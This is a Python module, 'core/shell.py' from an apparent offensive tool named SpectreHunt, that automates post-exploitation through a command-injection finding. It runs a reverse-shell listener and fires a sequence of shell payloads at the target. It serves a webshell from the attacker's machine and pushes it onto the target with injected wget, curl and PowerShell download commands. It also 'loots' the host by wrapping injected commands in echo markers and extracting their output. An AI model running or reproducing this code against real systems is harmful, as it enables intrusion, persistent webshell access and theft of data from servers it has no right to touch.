"""
SpectreHunt :: core/shell.py
Reverse-shell listener, webshell deployment and post-exploitation looting.

Offensive logic: a reverse shell fails for boring reasons -- no nc on target,
/dev/tcp disabled in sh, & mangled by the shell, egress blocked, NAT'd host.
So we fire a SEQUENCE of candidates at one listener and report which landed.
Nothing is claimed unless a TCP connection actually arrived.

Author : Inayat Hussain
"""

from __future__ import annotations

import re
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

from config import (
    LOOT_COMMANDS, LOOT_END, LOOT_START, SHELL_PAYLOADS, WEBSHELL_BODY,
    WEBSHELL_FILENAME, WEBSHELL_MARKER, WEBSHELL_REMOTE_DIRS, WEBSHELL_WEB_PATHS,
    log,
)
from utils.callback import local_ip

TAG_RE = re.compile(r"<[^>]+>")
WS_RE = re.compile(r"[ \t]+")


def clean(text: str) -> str:
    if not text:
        return ""
    text = TAG_RE.sub(" ", text)
    return "\n".join(WS_RE.sub(" ", ln).strip() for ln in text.splitlines() if ln.strip())


class Listener:
    def __init__(self, port: int = 0, host: str = "0.0.0.0"):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))
        self.port = self.sock.getsockname()[1]
        self.sock.listen(5)
        self.sock.settimeout(1.0)
        self.conn = None
        self.addr = None
        self._stop = False

    def start(self):
        threading.Thread(target=self._accept, daemon=True).start()
        return self

    def _accept(self):
        while not self._stop:
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            if self.conn is None:
                self.conn, self.addr = conn, addr
                return
            conn.close()

    def wait(self, timeout: float = 12.0) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.conn is not None:
                return True
            time.sleep(0.2)
        return False

    def close(self):
        self._stop = True
        for obj in (self.conn, self.sock):
            try:
                if obj:
                    obj.close()
            except Exception:
                pass


class _FileHandler(BaseHTTPRequestHandler):
    server_version = "SpectreHunt/5.1"

    def do_GET(self):  # noqa: N802
        path = self.path.split("?", 1)[0]
        body = self.server.files.get(path)
        if body is None:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


class FileServer:
    def __init__(self, files: dict, port: int = 0):
        self.httpd = ThreadingHTTPServer(("0.0.0.0", port), _FileHandler)
        self.httpd.files = files
        self.httpd.daemon_threads = True
        self.port = self.httpd.server_address[1]

    def start(self):
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        return self

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except Exception:
            pass


class ShellManager:
    def __init__(self, fuzzer, lhost: str | None = None, lport: int = 0,
                 timeout: int = 12):
        self.fz = fuzzer
        self.lhost = lhost or local_ip()
        self.lport = lport
        self.timeout = timeout

    def _fire(self, finding, payload: str):
        return self.fz.request(finding.url, finding.param, payload, finding.method)

    @staticmethod
    def _root(url: str) -> str:
        parts = urlsplit(url)
        return f"{parts.scheme}://{parts.netloc}"

    def catch(self, finding) -> dict:
        listener = Listener(self.lport).start()
        port = listener.port
        log("[SHELL]", f"listener {self.lhost}:{port} -- firing candidates")
        fired = []
        try:
            for family in ("unix", "windows"):
                for template in SHELL_PAYLOADS[family]:
                    payload = template.format(ip=self.lhost, port=port)
                    fired.append(payload)
                    self._fire(finding, payload)
            if listener.wait(self.timeout):
                return {"status": "CONFIRMED", "port": port, "payload": fired[0],
                        "detail": f"inbound TCP from {listener.addr}"}
            return {"status": "FAILED", "port": port, "payload": "",
                    "detail": f"no callback in {self.timeout}s -- check egress "
                              f"or pass --lhost with your VPN IP"}
        finally:
            if not listener.conn:
                listener.close()

    def deploy_webshell(self, finding) -> dict:
        server = FileServer({"/" + WEBSHELL_FILENAME: WEBSHELL_BODY}).start()
        url = f"http://{self.lhost}:{server.port}/{WEBSHELL_FILENAME}"
        log("[SHELL]", f"serving webshell at {url}")
        try:
            for remote_dir in WEBSHELL_REMOTE_DIRS:
                sep = "\\" if "\\" in remote_dir else "/"
                path = remote_dir.rstrip("/\\") + sep + WEBSHELL_FILENAME
                for template in ("wget {url} -O {path}",
                                 "curl -s {url} -o {path}",
                                 "powershell -c \"iwr {url} -OutFile '{path}'\""):
                    self._fire(finding, template.format(url=url, path=path))

            root = self._root(finding.url)
            for candidate in WEBSHELL_WEB_PATHS:
                body = self.fz.request(root + candidate, "__sh__", "1", "GET")
                if body and WEBSHELL_MARKER in body:
                    return {"status": "CONFIRMED", "url": root + candidate,
                            "detail": "webshell verified over HTTP"}
            return {"status": "FAILED", "url": "",
                    "detail": "no downloader landed -- adjust WEBSHELL_REMOTE_DIRS"}
        finally:
            server.stop()

    def loot(self, finding) -> list:
        windows = self.fz.os_family == "windows"
        results = []
        for unix_cmd, win_cmd in LOOT_COMMANDS:
            cmd = win_cmd if windows else unix_cmd
            if windows:
                wrapped = f"&echo {LOOT_START}&{cmd}&echo {LOOT_END}"
            else:
                wrapped = f";echo {LOOT_START};{cmd};echo {LOOT_END}"
            body = clean(self._fire(finding, wrapped) or "")
            match = re.search(re.escape(LOOT_START) + r"(.*?)" + re.escape(LOOT_END),
                              body, re.S)
            results.append((cmd, match.group(1).strip() if match else body[:600]))
        return results
